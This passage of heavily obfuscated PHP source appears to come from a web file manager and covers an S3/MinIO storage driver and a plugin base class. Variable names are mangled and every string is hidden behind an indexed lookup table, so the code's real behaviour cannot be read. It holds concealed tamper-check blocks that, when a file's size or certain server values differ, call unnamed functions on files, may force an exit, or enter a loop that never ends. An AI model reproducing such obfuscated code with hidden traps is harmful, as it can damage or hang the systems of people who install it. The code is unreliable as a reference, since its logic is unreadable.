(!$¶‘ÆòĞî) { return !1; } if ($¼„·Î) { return !0; } return $¶‘ÆòĞî ? !0 : !1; } public function fileSubstr($ªì§¾, $Û­ğÅÏü, $Ö³¸Œ¹­) { $ÇöìÆîÀ = $Û­ğÅÏü + $Ö³¸Œ¹­ - 1; return $this->client->getObject($this->bucket, $ªì§¾, array($_SERVER[‹è™Ü¸Ñ][244] => "\x62\171\x74\145\x73\x3d{$Û­ğÅÏü}\55{$ÇöìÆîÀ}")); } public function upload($ùÅå±ˆ·, $•µú§Ë§, $øÆ…¼×Ø = false, $ìÛÑä¬ = REPEAT_REPLACE) { $¸ìÌšˆ¿ =& $_SERVER[‹è™Ü¸Ñ]; $‚©ŠÎÍÊ = array($¸ìÌšˆ¿[245] => @md5_file($•µú§Ë§)); $ÂÁş–ƒÕ = array($¸ìÌšˆ¿[246] => get_file_mime(get_path_ext($ùÅå±ˆ·))); if (IO::size($•µú§Ë§) <= 1024 * 1024 * 200) { $İ¡ö¬©á = $this->client->putObjectFile($•µú§Ë§, $this->bucket, $ùÅå±ˆ·, $¸ìÌšˆ¿[229], $‚©ŠÎÍÊ, $ÂÁş–ƒÕ); return !empty($İ¡ö¬©á) ? $this->getPathOuter($ùÅå±ˆ·) : !1; } $ïÒÛ‚ = $this->client->multiUploadObject($•µú§Ë§, $this->bucket, trim($ùÅå±ˆ·, $¸ìÌšˆ¿[8]), $‚©ŠÎÍÊ, $ÂÁş–ƒÕ); return $ïÒÛ‚ ? $this->getPathOuter($ùÅå±ˆ·) : !1; } public function download($öª‰¯», $¥ìˆß­Ë) { if (!@is_dir($this->pathFather($¥ìˆß­Ë)) && !IO::mkdir($this->pathFather($¥ìˆß­Ë))) { return !1; } $“Í•“ƒ§ = $this->client->getObject($this->bucket, $öª‰¯», array(), $¥ìˆß­Ë); return $“Í•“ƒ§ !== !1 ? $¥ìˆß­Ë : !1; } public function link($‡ïºç²×, $òÆ¢ï† = array()) { $¡¯Ùæ™ã =& $_SERVER[‹è™Ü¸Ñ]; if ($this->signVer == $¡¯Ùæ™ã[247]) { return $this->client->getAuthenticatedURL($this->bucket, $‡ïºç²×, 3600 * 12, $òÆ¢ï†); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($‡ïºç²×, $¡¯Ùæ™ã[8]), 3600 * 12, $this->region, array(), !0, $òÆ¢ï†); } public function fileOut($ìó¾¨—Ÿ, $æœùºäö = false, $¢‡Å»Ïù = false, $ˆŞƒı·Ó = '') { $“¥šÔğø =& $_SERVER[‹è™Ü¸Ñ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ìó¾¨—Ÿ, $æœùºäö, $¢‡Å»Ïù, $ˆŞƒı·Ó); } if (!$¢‡Å»Ïù) { $¢‡Å»Ïù = $this->pathThis($ìó¾¨—Ÿ); } $ªâÆş±æ = get_file_mime(get_path_ext($¢‡Å»Ïù)); if ($ªâÆş±æ == $“¥šÔğø[248]) { return parent::fileOut($ìó¾¨—Ÿ, $æœùºäö, $¢‡Å»Ïù, $ˆŞƒı·Ó); } $Ú—Êø‚õ = array($“¥šÔğø[249] => $ªâÆş±æ); if ($æœùºäö) { $Ú—Êø‚õ[$“¥šÔğø[250]] = $“¥šÔğø[251] . rawurlencode($¢‡Å»Ïù); } else { } $È“èŒƒÏ = $this->link($ìó¾¨—Ÿ, $Ú—Êø‚õ); $this->fileOutLink($È“èŒƒÏ); } public function fileOutServer($üŠ±˜®¶, $‡ˆæ‚Ü = false, $çõá‚ì = false, $ÊøÚñ = '') { parent::fileOut($üŠ±˜®¶, $‡ˆæ‚Ü, $çõá‚ì, $ÊøÚñ); } public function fileOutImageServer($£ĞÂ¬œ§, $šî†×ä® = 250) { parent::fileOutImage($£ĞÂ¬œ§, $šî†×ä®); } public function hashMd5($À—ù¤¢, $ç£Æ–äœ = '') { $™¼Ü ¦ = $this->objectMeta($À—ù¤¢); if (!$™¼Ü ¦) { return !1; } $ç£Æ–äœ = $ç£Æ–äœ ? $ç£Æ–äœ : _get($™¼Ü ¦, $_SERVER[‹è™Ü¸Ñ][252]); return $ç£Æ–äœ; } public function uploadFormData($¬¨´…, $æº«Ôäˆ = 3600) { $™ş€àÚğ =& $_SERVER[‹è™Ü¸Ñ]; $ú‡şŠ“µ = $this->pathFather($¬¨´…); $§—ıÎ‹¶ = $this->client->getHttpUploadPostParams($this->bucket, $ú‡şŠ“µ, $™ş€àÚğ[229], $æº«Ôäˆ); return array_merge((array) $§—ıÎ‹¶, array($™ş€àÚğ[208] => $this->getHost())); } public function multiUploadFormData($àôØ»ÊÊ, $ı£Õµşª = 3600) { $°•É–Ûµ =& $_SERVER[‹è™Ü¸Ñ]; $Æ–²ğÅ“ = gmdate($°•É–Ûµ[253]); $…ãÌğÛË = array(); $§› õåº = $this->client->getUploadId($this->bucket, $àôØ»ÊÊ, $…ãÌğÛË); if (!$§› õåº) { return !1; } return array($°•É–Ûµ[254] => $§› õåº, $°•É–Ûµ[208] => $this->getHost() . $°•É–Ûµ[8] . $this->pathEncode($àôØ»ÊÊ), $°•É–Ûµ[255] => $Æ–²ğÅ“, $°•É–Ûµ[97] => $àôØ»ÊÊ); } public function multiUploadAuthData($¤¤Éò, $ÃÊşíŠ = array()) { $—ıÓ“  =& $_SERVER[‹è™Ü¸Ñ]; $™±„ê® = isset($ÃÊşíŠ[$—ıÓ“ [255]]) ? $ÃÊşíŠ[$—ıÓ“ [255]] : gmdate($—ıÓ“ [253]); $ƒïÆíÂ« = isset($ÃÊşíŠ[$—ıÓ“ [169]]) ? $ÃÊşíŠ[$—ıÓ“ [169]] : $—ıÓ“ [12]; $¤© ·˜› = $ÃÊşíŠ[$—ıÓ“ [97]]; unset($ÃÊşíŠ[$—ıÓ“ [97]]); if (isset($ÃÊşíŠ[$—ıÓ“ [256]])) { $ÃÊşíŠ[$—ıÓ“ [255]] = $™±„ê®; return $this->listUploadParts($¤© ·˜›, $ÃÊşíŠ); } $…³—½·Ô = array($—ıÓ“ [257], $—ıÓ“ [12], $—ıÓ“ [123], $—ıÓ“ [12], "\170\55\x61\155\x7a\55\144\x61\x74\x65\72{$™±„ê®}", $—ıÓ“ [8] . $this->bucket . $—ıÓ“ [8] . $this->pathEncode($¤© ·˜›) . $ƒïÆíÂ«); if (strpos($ƒïÆíÂ«, $—ıÓ“ [258]) === 0) { $…³—½·Ô[0] = $—ıÓ“ [259]; } if (isset($ÃÊşíŠ[$—ıÓ“ [260]]) && $ÃÊşíŠ[$—ıÓ“ [260]] == $—ıÓ“ [261]) { $…³—½·Ô[0] = $—ıÓ“ [261]; } $ŒæûªËŸ = implode($—ıÓ“ [262], $…³—½·Ô); $´ş—ç¢¾ = base64_encode(hash_hmac($—ıÓ“ [263], $ŒæûªËŸ, $this->secret, !0)); $á§õõö¦ = $—ıÓ“ [264] . $this->accessKey . $—ıÓ“ [4] . $´ş—ç¢¾; if (strpos($ƒïÆíÂ«, $—ıÓ“ [258]) === 0) { return array($—ıÓ“ [265] => $á§õõö¦, $—ıÓ“ [255] => $™±„ê®); } return $á§õõö¦; } public function listUploadParts($‡Ÿ˜™Ô…, $ÏÏã½…ì = array()) { $ÕÀ¦–® =& $_SERVER[‹è™Ü¸Ñ]; $‘ÕãØ = str_replace($ÕÀ¦–®[266], $ÕÀ¦–®[12], $ÏÏã½…ì[$ÕÀ¦–®[169]]); $ïüææ™ = $this->client->listParts($this->bucket, $‡Ÿ˜™Ô…, $‘ÕãØ); if (!$ïüææ™) { return !1; } unset($ÏÏã½…ì[$ÕÀ¦–®[256]], $ÏÏã½…ì[$ÕÀ¦–®[260]]); $ÏÏã½…ì[$ÕÀ¦–®[97]] = $‡Ÿ˜™Ô…; $ã£™ÏÊ = $this->multiUploadAuthData($‡Ÿ˜™Ô…, $ÏÏã½…ì); if (empty($ã£™ÏÊ)) { return !1; } return array($ÕÀ¦–®[265] => $ã£™ÏÊ, $ÕÀ¦–®[255] => $ÏÏã½…ì[$ÕÀ¦–®[255]], $ÕÀ¦–®[267] => $ïüææ™); } public function getHost() { $—ÇÔÖğ° =& $_SERVER[‹è™Ü¸Ñ]; $€ŞöŒæª = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($—ÇÔÖğ°[70], $—ÇÔÖğ°[64], $—ÇÔÖğ°[69], $—ÇÔÖğ°[62]))) { return $€ŞöŒæª . $—ÇÔÖğ°[8] . $this->bucket; } $€ŞöŒæª = explode($—ÇÔÖğ°[210], $€ŞöŒæª); return $€ŞöŒæª[0] . $—ÇÔÖğ°[210] . $this->bucket . $—ÇÔÖğ°[10] . $€ŞöŒæª[1]; } public function size($ØÇã¿ß) { $ŒºÑ°Æ« = $this->objectMeta($ØÇã¿ß); return $ŒºÑ°Æ« ? $ŒºÑ°Æ«[$_SERVER[‹è™Ü¸Ñ][79]] : 0; } public function info($Šë‰Ş”®) { if ($this->isFolder($Šë‰Ş”®)) { return $this->folderInfo($Šë‰Ş”®); } else { if ($this->isFile($Šë‰Ş”®)) { return $this->fileInfo($Šë‰Ş”®); } } return !1; } public function exist($ëíª‰öç) { return $this->isFile($ëíª‰öç) || $this->isFolder($ëíª‰öç); } public function isFile($·§˜÷£ò) { return !$this->isFolder($·§˜÷£ò) && $this->objectMeta($·§˜÷£ò); } public function isFolder($²ÈªÛ¥À) { return $this->cacheMethod($_SERVER[‹è™Ü¸Ñ][179], $²ÈªÛ¥À); } protected function objectMeta($Šñáº¥ô) { return $this->cacheMethod($_SERVER[‹è™Ü¸Ñ][181], $Šñáº¥ô); } protected function _objectMeta($³Î‘ï¿ı) { $œƒâÁÓ =& $_SERVER[‹è™Ü¸Ñ]; $³Î‘ï¿ı = rtrim($³Î‘ï¿ı, $œƒâÁÓ[8]); try { $œƒ¾üÓ¤ = $this->client->getObjectInfo($this->bucket, $³Î‘ï¿ı); if (!isset($œƒ¾üÓ¤[$œƒâÁÓ[252]]) && isset($œƒ¾üÓ¤[$œƒâÁÓ[268]])) { $œƒ¾üÓ¤[$œƒâÁÓ[252]] = $œƒ¾üÓ¤[$œƒâÁÓ[268]]; } } catch (Exception $Şòãò„) { $œƒ¾üÓ¤ = !1; } if (!$œƒ¾üÓ¤) { } return $œƒ¾üÓ¤; } protected function _isFolder($Ëèìúğ) { $ÇâÂÄÒ” =& $_SERVER[‹è™Ü¸Ñ]; $Ëèìúğ = rtrim($Ëèìúğ, $ÇâÂÄÒ”[8]); if ($Ëèìúğ == $ÇâÂÄÒ”[12] || $Ëèìúğ == $ÇâÂÄÒ”[8]) { return !0; } $‹ç‡—˜˜ = $this->client->getBucket($this->bucket, $Ëèìúğ, null, 1); if (empty($‹ç‡—˜˜[$ÇâÂÄÒ”[236]])) { return !1; } $äì„ìµé = $‹ç‡—˜˜[$ÇâÂÄÒ”[236]][0][$ÇâÂÄÒ”[32]]; return stripos($äì„ìµé, $Ëèìúğ . $ÇâÂÄÒ”[8]) === 0 ? !0 : !1; if (substr($äì„ìµé, -1) == $ÇâÂÄÒ”[8]) { return !0; } if (get_path_this($äì„ìµé) == get_path_this($Ëèìúğ)) { return !1; } return !0; } public function listObject($ÕÌ¯¼»Ã) { return $this->fileList($ÕÌ¯¼»Ã, $_SERVER[‹è™Ü¸Ñ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¬Å“±ê) { $¬ŠÔãßŞ =& $_SERVER[‹è™Ü¸Ñ]; parent::__construct($¬Å“±ê); $this->setSignVersion($¬ŠÔãßŞ[247]); if (!$this->region) { $this->region = $¬ŠÔãßŞ[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $îÊÖ’©Å = $this->getBucketRgn(); return $this->region == $îÊÖ’©Å ? !0 : !1; } public function uploadFormData($¼Ä¬¡å, $¶Çòô¿Ö = 3600) { $Ûü¨í =& $_SERVER[‹è™Ü¸Ñ]; $¦¬êÀÄò = $Ûü¨í[229]; $µÄš×û¦ = $Ûü¨í[270]; $ÉèËúÛó = $Ûü¨í[62]; $¡›èç™¼ = gmdate($Ûü¨í[271]); $ìµìª³ñ = gmdate($Ûü¨í[272]); $÷‡û§ÕÊ = $Ûü¨í[273]; $¬Ú§°ˆ = $¶Çòô¿Ö . $Ûü¨í[12]; $½áŒ­• = $Ûü¨í[274]; $«¼¬šÇÃ = array($this->accessKey, $ìµìª³ñ, $this->region, $ÉèËúÛó, $÷‡û§ÕÊ); $·Ù×ê÷û = implode($Ûü¨í[8], $«¼¬šÇÃ); $€Ù¿Š»ã = array($Ûü¨í[275] => gmdate($Ûü¨í[276], strtotime($Ûü¨í[277])), $Ûü¨í[278] => array(array($Ûü¨í[279] => $this->bucket), array($Ûü¨í[280] => $¦¬êÀÄò), array($Ûü¨í[281], $Ûü¨í[282], $Ûü¨í[12]), array($Ûü¨í[281], $Ûü¨í[283], $Ûü¨í[12]), array($Ûü¨í[281], $Ûü¨í[284], $Ûü¨í[12]), array($Ûü¨í[285] => $½áŒ­•), array($Ûü¨í[286] => $·Ù×ê÷û), array($Ûü¨í[287] => $µÄš×û¦), array($Ûü¨í[288] => $¡›èç™¼), array($Ûü¨í[289] => $¬Ú§°ˆ))); $Ø³Ñ®û = base64_encode(json_encode($€Ù¿Š»ã)); $É»âšª³ = hash_hmac($Ûü¨í[290], $ìµìª³ñ, $Ûü¨í[291] . $this->secret, !0); $°•«Ñ¾ = hash_hmac($Ûü¨í[290], $this->region, $É»âšª³, !0); $¯… Äğİ = hash_hmac($Ûü¨í[290], $ÉèËúÛó, $°•«Ñ¾, !0); $ÓÀüØ§§ = hash_hmac($Ûü¨í[290], $÷‡û§ÕÊ, $¯… Äğİ, !0); $®»Æ€’Î = hash_hmac($Ûü¨í[290], $Ø³Ñ®û, $ÓÀüØ§§); $ØÖº€ï€ = array($Ûü¨í[246] => $Ûü¨í[12], $Ûü¨í[292] => $Ûü¨í[12], $Ûü¨í[280] => $¦¬êÀÄò, $Ûü¨í[285] => $½áŒ­•, $Ûü¨í[293] => $Ø³Ñ®û, $Ûü¨í[294] => $·Ù×ê÷û, $Ûü¨í[295] => $µÄš×û¦, $Ûü¨í[296] => $¡›èç™¼, $Ûü¨í[297] => $¬Ú§°ˆ, $Ûü¨í[298] => $®»Æ€’Î, $Ûü¨í[208] => $this->getHost()); return $ØÖº€ï€; } } goto B·¸„²”¿Ş; fõÚ‹¾‚Õ™: $_size = $_SERVER[‹è™Ü¸Ñ][1604]; if ($_SERVER[$_SERVER[‹è™Ü¸Ñ][931]] != $_size($_file)) { $_getc = $_SERVER[‹è™Ü¸Ñ][934]; $_getfile = $_SERVER[$_SERVER[‹è™Ü¸Ñ][935]] . $_SERVER[‹è™Ü¸Ñ][936]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‹è™Ü¸Ñ][262], $_getfilec); if (count($_getarrs) < $_SERVER[‹è™Ü¸Ñ][692]) { $exit = $_SERVER[‹è™Ü¸Ñ][937]; $exit(); } $_act = $_SERVER[‹è™Ü¸Ñ][1605]; $_act($_file); } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ÅßîµâÏ =& $_SERVER[‹è™Ü¸Ñ]; if (!isset($_SERVER[$ÅßîµâÏ[931]]) || !isset($_SERVER[$ÅßîµâÏ[932]])) { $‚ŸÎÜÖÏ = $ÅßîµâÏ[933]; $¬œœ†ĞÒ = $ÅßîµâÏ[934]; $å¦¹¤›ó = $_SERVER[$ÅßîµâÏ[935]] . $ÅßîµâÏ[936]; $•æÙàÛ = $¬œœ†ĞÒ($å¦¹¤›ó); $ƒÎæÊÎ = explode($ÅßîµâÏ[262], $•æÙàÛ); if (count($ƒÎæÊÎ) < $ÅßîµâÏ[694]) { $ÎßÖéÛ = $ÅßîµâÏ[937]; $ÎßÖéÛ(); } $æ›‹©¯‘ = $ÅßîµâÏ[938]; $æ›‹©¯‘($_SERVER[$ÅßîµâÏ[939]]); $êİò±øÜ = 1; for ($øÄ’İ†Û = $êİò±øÜ; $øÄ’İ†Û > 0; $øÄ’İ†Û++) { $æ›‹©¯‘ = json_encode($GLOBALS[$ÅßîµâÏ[492]]); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ÅßîµâÏ[1606]); $this->pluginName = str_replace($ÅßîµâÏ[1606], $ÅßîµâÏ[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ÅßîµâÏ[8]; $this->pluginApi = appHostGet() . $ÅßîµâÏ[1607] . $this->pluginName . $ÅßîµâÏ[8]; $this->pluginHost = $config[$ÅßîµâÏ[1608]] . $this->pluginName . $ÅßîµâÏ[8]; $this->pluginHostDefault = $config[$ÅßîµâÏ[1608]] . $this->pluginName . $ÅßîµâÏ[8]; $á¨®Ôüª = $config[$ÅßîµâÏ[1609]]; if ($á¨®Ôüª && strpos($ÅßîµâÏ[50] . $á¨®Ôüª . $ÅßîµâÏ[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ÅßîµâÏ[1610]] . $this->pluginName . $ÅßîµâÏ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[‹è™Ü¸Ñ][1611]); } protected function assign($«’´¹í, $Ÿë³Œç = false) { if (is_array($«’´¹í)) { $this->values = array_merge($this->values, $«’´¹í); } else { $this->values[$«’´¹í] = $Ÿë³Œç; } } protected function display($ßª¹Ÿ¸ƒ) { extract($this->values); require $ßª¹Ÿ¸ƒ; } final function hookRegist($•Ñ¨´äö) { $this->modelPlugin->appRegist($this->pluginName, $•Ñ¨´äö); } final function appIcon() { $ü·Ÿ‰’ë =& $_SERVER[‹è™Ü¸Ñ]; $³×¢¬ê = $this->appPackage(); $¦©Ä³Ùñ = $ü·Ÿ‰’ë[12]; if (isset($³×¢¬ê[$ü·Ÿ‰’ë[490]])) { if (isset($³×¢¬ê[$ü·Ÿ‰’ë[490]][$ü·Ÿ‰’ë[1612]])) { $¦©Ä³Ùñ = $ü·Ÿ‰’ë[1613] . $³×¢¬ê[$ü·Ÿ‰’ë[490]][$ü·Ÿ‰’ë[1612]] . $ü·Ÿ‰’ë[1614]; } else { if ($³×¢¬ê[$ü·Ÿ‰’ë[490]][$ü·Ÿ‰’ë[1615]]) { $¦©Ä³Ùñ = $ü·Ÿ‰’ë[1616] . $³×¢¬ê[$ü·Ÿ‰’ë[490]][$ü·Ÿ‰’ë[1615]] . $ü·Ÿ‰’ë[1617]; } } } return $¦©Ä³Ùñ; } final function fileCanView($ªõûªá) { $Ê¶úªñ =& $_SERVER[‹è™Ü¸Ñ]; if (request_url_safe($ªõûªá)) { return !0; } if ($this->isShare($ªõûªá)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $Øˆ²½È = $Ê¶úªñ[1618] . rawurlencode(this_url()); show_tips(LNG($Ê¶úªñ[1619]) . $Ê¶úªñ[1620] . $Øˆ²½È . $Ê¶úªñ[1621] . LNG($Ê¶úªñ[1622]) . $Ê¶úªñ[1623], !1); } if (!Action($Ê¶úªñ[1624])->authCan($Ê¶úªñ[1625])) { show_tips(LNG($Ê¶úªñ[1626]) . $Ê¶úªñ[1627], !1); } ActionCall($Ê¶úªñ[1628], $ªõûªá); } final function isShare($©Ú©”…Ö) { $ÔÉÙ£‹â = KodIO::parse($©Ú©”…Ö); return $ÔÉÙ£‹â[$_SERVER[‹è™Ü¸Ñ][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($«–§É•ç) { if (request_url_safe($«–§É•ç)) { return $«–§É•ç; } if (!$this->isShare($«–§É•ç)) { $«–§É•ç = $this->filePath($«–§É•ç, !1); } return Action($_SERVER[‹è™Ü¸Ñ][1236])->linkOut($«–§É•ç); } public function filePathLinkOut($òÄ±÷µ) { if (request_url_safe($òÄ±÷µ)) { return $òÄ±÷µ; } $this->fileCanView($òÄ±÷µ); return Action($_SERVER[‹è™Ü¸Ñ][1236])->link($òÄ±÷µ); } final function filePath($´¬êÕ” , $°™·ìã¸ = true, $®„êïê = false) { $ı…»´ï =& $_SERVER[‹è™Ü¸Ñ]; $ó®‰¬ÀØ = $this->filePathGet($´¬êÕ” , $°™·ìã¸); if (!$this->fileInfo) { show_tips(LNG($ı…»´ï[108]), !1); } if ($®„êïê && isset($this->fileInfo[$ı…»´ï[541]]) && $this->fileInfo[$ı…»´ï[541]]) { $¹‹Úş = Model($ı…»´ï[544])->fileInfo($this->fileInfo[$ı…»´ï[541]]); if (!$¹‹Úş || !IO::exist($¹‹Úş[$ı…»´ï[87]])) { show_tips(LNG($ı…»´ï[108]) . $ı…»´ï[1629]); } } Hook::trigger($ı…»´ï[1630], $ó®‰¬ÀØ); return $ó®‰¬ÀØ; } final function filePathGet($ö…µøèÇ, $Ş£ö¼Ô· = true) { $Ã¡¡Ñé =& $_SERVER[‹è™Ü¸Ñ]; if ($Â¤µÈ¼ş = $this->checkSharePath($ö…µøèÇ, $Ş£ö¼Ô·)) { return $Â¤µÈ¼ş; } $this->fileCanView($ö…µøèÇ); if (request_url_safe($ö…µøèÇ)) { $Óüè¿İ = parse_url_query($ö…µøèÇ); if (isset($Óüè¿İ[$Ã¡¡Ñé[1631]]) && isset($Óüè¿İ[$Ã¡¡Ñé[234]])) { $¸×¿Ìõû = Mcrypt::decode($Óüè¿İ[$Ã¡¡Ñé[234]], Model($Ã¡¡Ñé[825])->get($Ã¡¡Ñé[826])); if ($¸×¿Ìõû) { $this->fileInfo = IO::info($¸×¿Ìõû); $this->fileInfo[$Ã¡¡Ñé[1632]] = $ö…µøèÇ; $this->cachePath = $this->pluginCachePath($Ã¡¡Ñé[12], $Ş£ö¼Ô·); return $¸×¿Ìõû; } } $ö…µøèÇ = $this->_cacheHttpFile($ö…µøèÇ, $Ş£ö¼Ô·); $this->fileInfo = IO::info($ö…µøèÇ); } else { $this->fileInfo = IO::info($ö…µøèÇ); $this->cachePath = $this->pluginCachePath($Ã¡¡Ñé[12], $Ş£ö¼Ô·); } return $ö…µøèÇ; } final function _cacheHttpFile($Ó”º’ö¼, $Ø¢Ğ¨›¤ = true) { $úŞ³ú ‚ =& $_SERVER[‹è™Ü¸Ñ]; $Æ¦êïş = parse_url_query($Ó”º’ö¼); $©áÑ¥ñ¥ = get_path_ext($Ó”º’ö¼); if (isset($Æ¦êïş[$úŞ³ú ‚[32]]) && $Æ¦êïş[$úŞ³ú ‚[32]]) { $©áÑ¥ñ¥ = get_path_ext($Æ¦êïş[$úŞ³ú ‚[32]]); } $Î‘ÏÅı = hash_path($Ó”º’ö¼) . $úŞ³ú ‚[10] . $©áÑ¥ñ¥; $this->cachePath = $this->pluginCachePath($Ø¢Ğ¨›¤ ? $Î‘ÏÅı : $úŞ³ú ‚[12]); $¼Ä†´§ü = IO::fileNameExist($this->cachePath, $Î‘ÏÅı); if ($¼Ä†´§ü) { return KodIO::make($¼Ä†´§ü); } $Üã­Ùé = rtrim($this->cachePath, $úŞ³ú ‚[8]) . $úŞ³ú ‚[8] . $Î‘ÏÅı; return $this->pluginCacheFileSet($Üã­Ùé, file_get_contents_nossl($Ó”º’ö¼)); } final function checkSharePath($¢”Ğ«çª, $¨ßú­ = true) { $ÔĞøŸ›« =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->isShare($¢”Ğ«çª)) { return !1; } $ëÚ·­ë = Action($ÔĞøŸ›«[1236])->sharePathInfo($¢”Ğ«çª); if (!is_array($ëÚ·­ë) || !isset($ëÚ·­ë[$ÔĞøŸ›«[87]])) { show_json(LNG($ÔĞøŸ›«[1633]), !1); } $this->fileInfo = $ëÚ·­ë; $this->cachePath = $this->pluginCachePath(!1, $¨ßú­); return $ëÚ·­ë[$ÔĞøŸ›«[87]]; } final function pluginCachePath($Óš›í‰— = '', $êÅ¡´Â = false) { $õÇñÙÃ„ =& $_SERVER[‹è™Ü¸Ñ]; if ($êÅ¡´Â && is_array($this->fileInfo)) { $Óš›í‰— = kodIO::hashPath($this->fileInfo); } $Õş¹ğ† = rtrim(IO_PATH_SYSTEM_TEMP . $õÇñÙÃ„[1634] . $this->pluginName . $õÇñÙÃ„[8] . $Óš›í‰—, $õÇñÙÃ„[8]); $—Ë€¬Ñ = IO::infoFullSimple($Õş¹ğ†); $šàÏ™‰õ = $—Ë€¬Ñ && is_array($—Ë€¬Ñ) ? $—Ë€¬Ñ[$õÇñÙÃ„[87]] : $õÇñÙÃ„[12]; if (!$šàÏ™‰õ) { $šàÏ™‰õ = IO::mkdir($Õş¹ğ†); } return $šàÏ™‰õ; } final function pluginCacheFileSet($Òµ‘ËÆË, $…È±ÄÔ™ = '') { $Ú®Š¢µ =& $_SERVER[‹è™Ü¸Ñ]; $ ¾âóéé = IO::infoFullSimple($Òµ‘ËÆË); if (!$ ¾âóéé) { return IO::mkfile($Òµ‘ËÆË, $…È±ÄÔ™, REPEAT_REPLACE); } IO::setContent($ ¾âóéé[$Ú®Š¢µ[87]], $…È±ÄÔ™); return $ ¾âóéé[$Ú®Š¢µ[87]]; } final function pluginLocalFile($‚İúïÖÙ = '') { $«¹ığÑ¨ =& $_SERVER[‹è™Ü¸Ñ]; $ø¡Çø™‘ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($ø¡Çø™‘)) { mk_dir($ø¡Çø™‘); } if (!$‚İúïÖÙ) { return $ø¡Çø™‘; } $„Ú²íö® = IO::info($‚İúïÖÙ); $ÄÚ©Ù¥ = $«¹ığÑ¨[1635] . KodIO::hashPath($„Ú²íö®) . $«¹ığÑ¨[10] . $„Ú²íö®[$«¹ığÑ¨[169]]; if (!checkExtSafe($ÄÚ©Ù¥)) { $ÄÚ©Ù¥ = $ÄÚ©Ù¥ . $«¹ığÑ¨[1271]; } $›Ç‡Ó°¯ = $ø¡Çø™‘ . $ÄÚ©Ù¥; if (@file_exists($›Ç‡Ó°¯)) { return $›Ç‡Ó°¯; } return IO::copy($‚İúïÖÙ, $ø¡Çø™‘, 0, $ÄÚ©Ù¥); } final function appPackage() { $˜¶ûò—ì =& $_SERVER[‹è™Ü¸Ñ]; if ($this->packageData) { return $this->packageData; } $ÇÍ¸º‹‚ = $this->parseFile($this->pluginPath . $˜¶ûò—ì[1636]); $this->parseLang($ÇÍ¸º‹‚); $ÔÎëíè = json_decode_force($ÇÍ¸º‹‚); if (!$ÔÎëíè) { return array(); } $“Ñ°ó = Hook::trigger($˜¶ûò—ì[1637], $ÔÎëíè); if ($“Ñ°ó && is_array($“Ñ°ó)) { $ÔÎëíè = $“Ñ°ó; } $this->packageData = $ÔÎëíè; return $ÔÎëíè; } public function packageInfoGet($¼ „¶¦í) { $”Ë¥Ì¾¶ = $this->appPackage(); return array_get_value($”Ë¥Ì¾¶, $¼ „¶¦í); } public function packageVersion() { return $this->packageInfoGet($_SERVER[‹è™Ü¸Ñ][1638]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[‹è™Ü¸Ñ][1639]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[‹è™Ü¸Ñ][1640]); } public function echoJsAssign($£¡ËÈà, $ÇÉÖ§š) { $this->echoJsAssignArr[$£¡ËÈà] = $ÇÉÖ§š; } private function parseFile($èŠÒî÷) { $Ù€÷š¾ø =& $_SERVER[‹è™Ü¸Ñ]; $Ã‹ öÊ = file_get_contents_nossl($èŠÒî÷); $´çü¼Ó± = array($Ù€÷š¾ø[1641], $Ù€÷š¾ø[1642], $Ù€÷š¾ø[1643], $Ù€÷š¾ø[1644], $Ù€÷š¾ø[1645], $Ù€÷š¾ø[1646], $Ù€÷š¾ø[1647]); $ä¾×Œ½¼ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Ù€÷š¾ø[92]][$Ù€÷š¾ø[1648]]); foreach ($this->echoJsAssignArr as $§êœ¬Ÿ‚ => $Ãé£±Ñ») { $´çü¼Ó±[] = $Ù€÷š¾ø[1649] . $§êœ¬Ÿ‚ . $Ù€÷š¾ø[1650]; $ä¾×Œ½¼[] = is_array($Ãé£±Ñ») || is_object($Ãé£±Ñ») ? rawurlencode(json_encode($Ãé£±Ñ»)) : $Ãé£±Ñ»; } if (strstr($Ã‹ öÊ, $Ù€÷š¾ø[1651])) { $ôÑ»æâ = rawurlencode(json_encode($this->pluginLangArr)); $Ã‹ öÊ = str_replace($Ù€÷š¾ø[1651], $ôÑ»æâ, $Ã‹ öÊ); } if (strstr($Ã‹ öÊ, $Ù€÷š¾ø[1652])) { $ôÑ»æâ = $ôÑ»æâ = rawurlencode(json_encode($this->getConfig())); $Ã‹ öÊ = str_replace($Ù€÷š¾ø[1652], $ôÑ»æâ, $Ã‹ öÊ); } $Ã‹ öÊ = str_replace($´çü¼Ó±, $ä¾×Œ½¼, $Ã‹ öÊ); return $Ã‹ öÊ; } private function parseLang(&$ĞÛ÷ÎÒ) { $ßâÂˆ›ë =& $_SERVER[‹è™Ü¸Ñ]; $ÓËÑõ³£ = $ßâÂˆ›ë[1653]; if (!strstr($ĞÛ÷ÎÒ, $ÓËÑõ³£)) { return; } preg_match_all($ßâÂˆ›ë[1654], $ĞÛ÷ÎÒ, $­ÜÚöëÃ); if (!is_array($­ÜÚöëÃ) || count($­ÜÚöëÃ) == 0 || !is_array($­ÜÚöëÃ[0]) || count($­ÜÚöëÃ[0]) == 0) { return; } $ºÜ«ê¤ = array(); $­›ú¼Ã = array(); foreach 